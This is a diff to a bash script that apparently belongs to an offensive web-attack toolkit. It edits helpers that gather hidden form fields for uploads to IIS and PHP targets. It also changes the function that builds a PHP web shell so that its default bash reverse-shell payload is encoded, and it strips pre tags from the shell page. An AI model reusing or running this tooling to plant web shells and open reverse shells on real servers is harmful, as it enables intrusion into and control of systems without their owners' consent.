@@ -84,9 +84,13 @@ get_hidden_inputs() {
 }
 
 get_iis_hidden_inputs() {
-    local url="$1"
-    local target_form="$2"
-    local hidden_inputs=$(get_hidden_inputs "$url" "$target_form")
+    if [[ -z "$target_url" ]]; then
+        target_url="$1"
+    fi
+    if [[ -z "$target_form" ]]; then
+        target_form="$2"
+    fi
+    local hidden_inputs=$(get_hidden_inputs "$target_url" "$target_form")
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/ -F /g')
     hidden_inputs="-F $hidden_inputs"
@@ -94,9 +98,13 @@ get_iis_hidden_inputs() {
 }
 
 get_post_hidden_inputs() {
-    local url="$1"
-    local target_form="$2"
-    local hidden_inputs=$(get_hidden_inputs "$url" "$target_form")
+    if [[ -z "$target_url" ]]; then
+        target_url="$1"
+    fi
+    if [[ -z "$target_form" ]]; then
+        target_form="$2"
+    fi
+    local hidden_inputs=$(get_hidden_inputs "$target_url" "$target_form")
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
     echo $hidden_inputs
@@ -131,8 +139,9 @@ run_aspx_shell_command() {
 
 create_php_web_shell() {
     cp $SCRIPTDIR/../php/webshell.php .
-    if [ -z "$cmd" ]; then
+    if [[ -z "$cmd" ]]; then
         cmd=$(get_bash_reverse_shell)
+        cmd=$(encode_bash_payload "$cmd")
     fi
     local cmd_replacement=$(escape_sed "$cmd")
     cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
@@ -143,6 +152,7 @@ create_php_web_shell() {
         sed -E -i '/body/d' webshell.php
         sed -E -i '/title/d' webshell.php
         sed -E -i '/head/d' webshell.php
+        sed -E -i '/pre/d' webshell.php        
     fi
 }
 
